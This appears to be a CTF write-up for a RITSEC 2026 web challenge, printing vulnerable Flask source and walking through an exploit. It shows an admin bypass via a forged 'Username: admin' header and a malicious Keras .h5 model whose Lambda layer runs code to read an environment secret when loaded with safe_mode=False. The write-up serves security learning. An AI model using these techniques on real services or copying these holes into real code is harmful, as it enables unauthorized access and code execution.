---
layout: post
title:  "Regular Dude"
date:   2026-04-06 18:25:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RITSECCTF-2026-regular-dude/
---

**Category**: web

**Description**: This guy around the neighborhood keeps calling himself "Regular Dude." He's always talking about how he's "regular" and "normal." But I don't know, something about him just seems off. Maybe you can figure out what's going on with him? _This challenge was sponsored by SkillBit._

I get the challenge files. Contents of `main.py`:
```python
from flask import Flask, request, jsonify, session, redirect, render_template, url_for
import random
from tensorflow import keras, constant
import numpy as np
import hashlib
import re
import sqlite3


db = sqlite3.connect('users.db', check_same_thread=False)
cursor = db.cursor()

# Create users table if it doesn't exist
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password TEXT NOT NULL
                )''')
db.commit()

app = Flask(__name__)
app.secret_key = random.randbytes(16)

def admin_required(f):
    """
    Admin middleware. Using re, check if session username is equal to "admin", ignore case.
    """
    def wrapper(*args, **kwargs):
        username = session.get('username') or request.headers.get('Username', '')
        if re.match(r'^admin$', username, re.IGNORECASE):
            return f(*args, **kwargs)
        else:
            return jsonify({'error': 'Unauthorized'}), 401
    wrapper.__name__ = f.__name__
    return wrapper

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')

    if request.is_json:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
    else:
        username = request.form.get('username')
        password = request.form.get('password')

    if not username or not password:
        return jsonify({'error': 'Username and password are required'}), 400
    elif username.lower() == 'admin':
        return jsonify({'error': 'Username "admin" is reserved'}), 400

    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
    db.commit()

    if request.is_json:
        return jsonify({'message': 'User registered successfully'}), 201
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    if request.is_json:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
    else:
        username = request.form.get('username')
        password = request.form.get('password')

    cursor.execute("SELECT * FROM users WHERE username=?", (username,))
    user = cursor.fetchone()

    if user and user[2] == password:
        session['username'] = username
        if request.is_json:
            return jsonify({'message': 'Login successful'}), 200
        else:
            return redirect(url_for('index'))
    else:
        if request.is_json:
            return jsonify({'error': 'Invalid credentials'}), 401
        else:
            return render_template('login.html', error='Invalid credentials')
    
@app.route('/logout', methods=['POST', 'GET'])
def logout():
    session.clear()
    return redirect('/')


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html', username=session.get('username'))


@app.route('/upload-model', methods=['GET'])
@admin_required
def upload_page():
    return render_template('upload.html')

@app.route('/model', methods=['POST'])
@admin_required
def model():
    # Admin will upload a model file, we will load it and execute it.
    if 'model' not in request.files:
        return jsonify({'error': 'No model file uploaded'}), 400
    model_file = request.files['model']
    model_path = f"/tmp/{hashlib.md5(model_file.filename.encode()).hexdigest()}.h5"
    model_file.save(model_path)

    try:
        model = keras.models.load_model(model_path, safe_mode=False)
        input_data = constant([[0.0]])  # Default input

        predictions = model.predict(input_data)

        def sanitize(obj):
            # Recursively convert tensors, numpy types and bytes to JSON-serializable Python types
            if hasattr(obj, 'numpy') and callable(getattr(obj, 'numpy')):
                return sanitize(obj.numpy())
            if hasattr(obj, 'tolist') and not isinstance(obj, (bytes, bytearray)):
                try:
                    return sanitize(obj.tolist())
                except Exception:
                    pass
            if isinstance(obj, (bytes, bytearray)):
                try:
                    return obj.decode('utf-8')
                except Exception:
                    return obj.decode('utf-8', errors='replace')
            if isinstance(obj, np.generic):
                return obj.item()
            if isinstance(obj, (list, tuple)):
                return [sanitize(x) for x in obj]
            if isinstance(obj, dict):
                return {k: sanitize(v) for k, v in obj.items()}
            return obj

        return jsonify({'predictions': sanitize(predictions)}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

`Dockerfile`:
```shell
cat Dockerfile  
FROM python:3.10-slim  
  
RUN pip install --no-cache-dir flask tensorflow-cpu  
  
WORKDIR /app  
  
COPY src/ .  
  
ENV FLAG=REDACTED  
  
EXPOSE 5000  
CMD ["python", "main.py"]
```

I can see from `main.py` that you can register and login to the site. After you login there is `/upload-model` and `/model`. However you need to be admin to access them. 

In the `admin_required()` function I see I can become admin by adding the header `Username: admin` to my requests:
```python
def admin_required(f):
    """
    Admin middleware. Using re, check if session username is equal to "admin", ignore case.
    """
    def wrapper(*args, **kwargs):
        username = session.get('username') or request.headers.get('Username', '')
        if re.match(r'^admin$', username, re.IGNORECASE):
            return f(*args, **kwargs)
        else:
            return jsonify({'error': 'Unauthorized'}), 401
    wrapper.__name__ = f.__name__
    return wrapper
```

After logging in and accessing `/upload-model` I should be able to upload a `.h5` file which retrieves the flag from the environment variable. This is because tensorflows security protections are disabled:
```python
model = keras.models.load_model(model_path, safe_mode=False)
```
`safe_mode=False` allows arbitrary python code embedded inside lambda layers to be deserialized and executed.

This forces the lambda layer to run which executes the code:
```python
predictions = model.predict(input_data)
```

I go to my instance at `https://regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club/`:

![Alt text](/images/regular-dude.png)

I register and login to the site:

![Alt text](/images/regular-dude2.png)

Then I go to `/upload-model` and intercept the request with burp. The request initially looks like this:
```http
GET /upload-model HTTP/1.1
Host: regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club
Cookie: af30f69fdfc9ef3db61356326adcb456=8d8e51e50a33d259fea00ceb02d433f2; session=eyJ1c2VybmFtZSI6InV6aSJ9.adGXhg.yOE4drP2MjlbFZysfPu7iQobZ7I
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

Change the request to this:
```http
GET /upload-model HTTP/1.1
Host: regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club
Username: admin
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

Once forwarded I am on `/upload-model` and can upload the malicious `.h5` file:

![Alt text](/images/regular-dude3.png)

Contents of my `exploit.py` which will generate the `.h5` file:
```python
import tensorflow as tf
import os

model = tf.keras.Sequential([
    tf.keras.layers.Lambda(lambda x: [[os.environ.get("FLAG", "not found")]])
])

model.save("exploit.h5")
print("Saved exploit.h5")
```

At this part it was important to pay attention to what version of python they are using. I had to run `exploit.py` like this:
```shell
docker run --rm -v $(pwd):/work -w /work python:3.10-slim bash -c "pip install tensorflow-cpu -q && python exploit.py"
```

Otherwise I would get this response because bytecode format changes between python versions:
```http
HTTP/1.1 500 INTERNAL SERVER ERROR
server: Werkzeug/3.1.7 Python/3.10.20
date: Sat, 04 Apr 2026 21:56:57 GMT
content-type: application/json
content-length: 49
vary: Cookie
set-cookie: 3a13999ec187e9cd0d186d3608e9ba4d=db342b6295cbf43a3f246de56c7eeeea; path=/; HttpOnly; Secure; SameSite=None

{"error":"bad marshal data (unknown type code)"}
```

Once I have `exploit.h5` I upload it to the site and use the same `Username: admin` header bypass as before. Final request:
```http
POST /model HTTP/1.1
Host: regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club
Username: admin
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club/upload-model
Content-Type: multipart/form-data; boundary=----geckoformboundary33d255e1671dceaa30fb3c617ebde550
Content-Length: 8645
Origin: https://regular-dude-abe3b4aa-fc7c-475d-bbeb-c4d3aab40b7b.ctf.ritsec.club
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundary33d255e1671dceaa30fb3c617ebde550
Content-Disposition: form-data; name="model"; filename="exploit.h5"
Content-Type: application/octet-stream

... etc etc
tensorflowÆ{"class_name": "Sequential", "config": {"name": "sequential", "trainable": true, "dtype": {"module": "keras", "class_name": "DTypePolicy", "config": {"name": "float32"}, "registered_name": null}, "layers": [{"class_name": "Lambda", "config": {"name": "lambda", "trainable": true, "dtype": {"module": "keras", "class_name": "DTypePolicy", "config": {"name": "float32"}, "registered_name": null}, "function": {"class_name": "__lambda__", "config": {"code": "4wEAAAAAAAAAAAAAAAEAAAAEAAAAQwAAAHMSAAAAdABqAaACZAFkAqECZwFnAVMAKQNO2gRGTEFH\n+glub3QgZm91bmQpA9oCb3PaB2Vudmlyb27aA2dldCkB2gF4qQByBwAAAPoQL3dvcmsvZXhwbG9p\ndC5wedoIPGxhbWJkYT4FAAAAcwIAAAASAA==\n", "defaults": null, "closure": null}}, "arguments": {}}}]}}
... etc etc
```

Response:
```http
HTTP/1.1 200 OK
server: Werkzeug/3.1.7 Python/3.10.20
date: Sat, 04 Apr 2026 23:03:57 GMT
content-type: application/json
content-length: 67
vary: Cookie
set-cookie: af30f69fdfc9ef3db61356326adcb456=8d8e51e50a33d259fea00ceb02d433f2; path=/; HttpOnly; Secure; SameSite=None

{"predictions":[["\"RS{R3gul4r_Dud3_w1th_4n_1rregular_m0d37}\""]]}
```

`RS{R3gul4r_Dud3_w1th_4n_1rregular_m0d37}`